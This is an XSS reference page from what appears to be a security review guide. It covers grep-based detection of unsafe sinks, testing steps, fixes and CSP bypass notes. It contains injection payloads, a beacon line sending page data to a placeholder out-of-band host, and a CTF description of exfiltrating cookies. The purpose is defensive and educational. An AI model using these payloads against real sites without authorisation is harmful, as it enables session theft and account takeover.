# Cross-Site Scripting (XSS) — A05:2025 (Injection)

Attacker-controlled data is reflected into a page and executed as script in the victim's browser,
running with the victim's session/origin. Impact ranges from session theft and account takeover to
self-propagating worms. CWE-79.

## Mechanical scan

> **Quick mode only.** Run these greps, apply skip conditions, report matches.
> No further analysis needed in quick mode.

**STEP 1 — Explicit auto-escape disabling**
```bash
rg -n "dangerouslySetInnerHTML|v-html|\| safe|mark_safe|Markup\(|\.raw\(|noescape|\{!! " .
```
- **SKIP if:** path contains `/test/`, `/mock/`, `__tests__/`, `fixtures/`
- **SKIP if:** the variable is a static/trusted string, not user input
- **FINDING if not skipped:** Type: XSS (auto-escape disabled) | Severity: High | Fix: Remove escape bypass or sanitize with DOMPurify/Bleach before rendering

**STEP 2 — DOM sink usage**
```bash
rg -n "innerHTML|outerHTML|insertAdjacentHTML|document\.write\(|document\.writeln\(" .
```
- **SKIP if:** path contains `/test/` or the value is a static string/template literal without variables
- **FINDING if not skipped:** Type: DOM XSS | Severity: Medium | Fix: Use textContent or sanitize input before DOM insertion

**Output template (quick mode):**
```
| File:Line | Type | Severity | Pattern | Fix |
|---|---|---|---|---|
```

## Three types

- **Reflected** — payload in the request is echoed straight into the response (needs the victim to
  open a crafted link). Medium by default.
- **Stored** — payload persisted (comment, profile, filename) and served to *other* users. High —
  no interaction beyond viewing.
- **DOM-based** — the vuln is entirely client-side: JS takes a *source* (`location.hash`,
  `document.referrer`, `postMessage`, URL params) and writes it to a *sink* (`innerHTML`, `eval`,
  `document.write`, `setAttribute('href')`, `insertAdjacentHTML`) without sanitizing.

## Where it hides

Anywhere user input reaches HTML/JS without context-correct encoding: search results, error messages,
usernames/profiles, comments, filenames, URL params reflected in the page, `Referer`-driven UI,
markdown/HTML editors, SVG, PDF generators, and **any client-side template** (`v-html`,
`dangerouslySetInnerHTML`, Angular bypassSecurityTrustHtml).

## How to find it

**Dynamic:**
1. Inject a unique marker (`lng9134`) into every input and find where it reflects (HTML body, attribute,
   JS context, URL, CSS). Context determines the payload.
2. Escalate marker → break out of the context:
   - HTML body: `<img src=x onerror=alert(document.domain)>`
   - attribute: `" autofocus onfocus=alert(1) x="` (break the quote)
   - JS string: `';alert(1);//`
   - URL/href: `javascript:alert(1)`
3. **DOM XSS:** trace sources→sinks in the JS (DevTools, `DOMInvader` in Burp). Test `#`/query-driven
   sinks: `?q=<svg onload=alert(1)>`, `#"><img...>`.
4. Note **filters** and craft context-aware bypasses (case, encoding, broken tags, event handlers,
   `<svg>`/`<math>`, no-parentheses payloads). Test for **CSP** and whether it actually blocks
   execution.

Prefer `alert(document.domain)` / a benign DNS callback as proof — not cookie theft against real
users.

**Static:** grep the sinks and trace back to user input:
```bash
rg -n "innerHTML|outerHTML|insertAdjacentHTML|document\.write|dangerouslySetInnerHTML|v-html|bypassSecurityTrust|\beval\(" .
rg -n "render_template_string|\|safe|mark_safe|raw\b|html\.unescape" .   # server-side template raw output
```

## How to confirm (PoC)

Demonstrate script execution in the page's origin: `alert(document.domain)` popping on the target's
domain, or a benign out-of-band beacon (`new Image().src='//<oob>/'+document.domain`). For stored XSS,
show it fires for a *second* account/viewer. Capture the exact injection point and payload.

## How to fix

- **Context-aware output encoding** is the primary control — HTML-encode for HTML, JS-encode for
  script context, URL-encode for URLs, CSS-encode for styles. Let the framework do it (React/Vue/
  Angular auto-escape by default — the bug is usually a `raw`/`v-html`/`dangerouslySetInnerHTML`
  escape hatch).
- **Don't sink untrusted HTML.** If you must render user HTML, **sanitize with an allowlist library**
  (DOMPurify client-side; OWASP Java HTML Sanitizer / Bleach server-side). Never hand-roll a blocklist.
- **DOM XSS:** use safe sinks (`textContent`, not `innerHTML`); avoid `eval`/`Function`/`document.write`;
  treat `Trusted Types` (CSP `require-trusted-types-for 'script'`) as a strong structural defense.
- **Defense-in-depth:** a strict **Content-Security-Policy** (nonce/hash-based, no `unsafe-inline`),
  `HttpOnly` cookies (so XSS can't read the session), and input validation.

```jsx
// ❌ <div dangerouslySetInnerHTML={{__html: userBio}} />
// ✅ render as text, or sanitize:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />
```

## CSP & mXSS notes

- A weak CSP (`unsafe-inline`, wildcard sources, JSONP/`unsafe-eval`, exploitable CDN) gives a false
  sense of safety — test whether your payload still runs.
- **Mutation XSS (mXSS):** the browser's HTML parser "fixes" sanitized markup back into executable
  form. Keep sanitizers updated; prefer Trusted Types.

## Advanced: gadget-based & CSP-bypassing XSS

- **Prototype pollution → DOM XSS** — a polluted property flows into a sink in the app's *own trusted*
  code, frequently **bypassing CSP**. See [prototype-pollution.md](prototype-pollution.md).
- **DOM clobbering** — inject named HTML (`<a id=x>`, `<form id=x><input name=y>`) to overwrite JS
  variables the app reads (`window.x.y`), turning non-script HTML injection into code execution.
  [PortSwigger: DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering).
- **CSP bypass** — JSONP/Angular gadgets on allowlisted hosts, `unsafe-inline`/`unsafe-eval`, missing
  `base-uri`/`object-src`, uploading a same-origin script, or dangling-markup exfil when scripts are blocked.
- **Mutation XSS (mXSS)** — markup that's safe until the browser re-parses it; **DOMPurify** bypasses via
  namespace confusion/template tricks recur — always pin and test the exact sanitizer + version.

## CTF angle

XSS challenges usually require stealing an admin "bot" cookie/visiting your payload: craft a payload
that exfiltrates `document.cookie` to your server (in the *sanctioned* lab), bypass a given filter/CSP,
or chain DOM XSS via `postMessage`/`location`. Read the bot's behavior to know the target context.

## Real-world cases

Disclosed HackerOne reports with PoCs:
[XSS](https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXSS.md)
(reflected/stored/DOM, CSP bypass, mutation XSS — hundreds of real payloads & impact chains).

## References

[OWASP A05:2025](https://owasp.org/Top10/2025/) · WSTG-CLNT-01/02 · [CWE-79](https://cwe.mitre.org/data/definitions/79.html) ·
OWASP [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) / [DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) / [CSP](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) Cheat Sheets ·
[PortSwigger: XSS](https://portswigger.net/web-security/cross-site-scripting) · [DOMPurify](https://github.com/cure53/DOMPurify). Full bibliography: [research/web.md](../../research/web.md). Back to [web/](README.md).
